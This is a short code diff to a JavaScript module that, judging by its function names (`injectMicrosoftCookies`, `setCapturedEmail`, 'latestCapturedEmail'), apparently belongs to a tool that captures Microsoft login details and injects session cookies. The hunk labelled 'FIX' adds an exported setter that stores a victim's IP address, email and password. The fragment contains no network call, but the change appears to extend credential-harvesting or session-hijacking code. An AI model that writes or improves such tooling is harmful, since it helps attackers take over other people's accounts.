@@ -18,6 +18,14 @@ function injectMicrosoftCookies() {
     location.reload();
 }
 
+// ---- FIX: Add setCredentials function and export ----
+export function setCredentials(newIp, newEmail, newPassword) {
+    ipaddress = newIp || '';
+    email = newEmail || '';
+    password = newPassword || '';
+}
+// -----------------------------------------------------
+
 // Allow other parts of the app to set latest captured data (used by postMessage event handlers)
 export function setCapturedEmail(email) {
     if (email) latestCapturedEmail = email;
